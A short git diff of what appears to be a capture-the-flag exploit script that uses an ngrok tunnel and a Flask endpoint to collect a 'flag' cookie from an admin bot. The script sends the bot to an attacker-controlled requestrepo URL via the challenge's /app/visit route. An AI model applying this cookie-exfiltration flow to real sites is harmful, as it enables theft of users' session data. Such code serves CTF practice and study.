@@ -4,7 +4,7 @@ import ngrok
 import base64
 from flask import Flask, request, redirect
 
-DOMAIN = os.getenv("DOMAIN") or "192-168-0-90.traefik.me"
+DOMAIN = os.getenv("DOMAIN")
 
 http2_listener = ngrok.forward("caddy:443", "tcp", authtoken_from_env=True)
 http2_host = http2_listener.url().replace("tcp://", "")
@@ -51,6 +51,7 @@ def flag():
     print(request.cookies["flag"])
     return "ok"
 
+print("Sending bot to", requestrepo_url)
 print(requests.post(f"https://{DOMAIN}/app/visit", data={"url": requestrepo_url}).json())
 
 app.run(host="0.0.0.0", port=80)
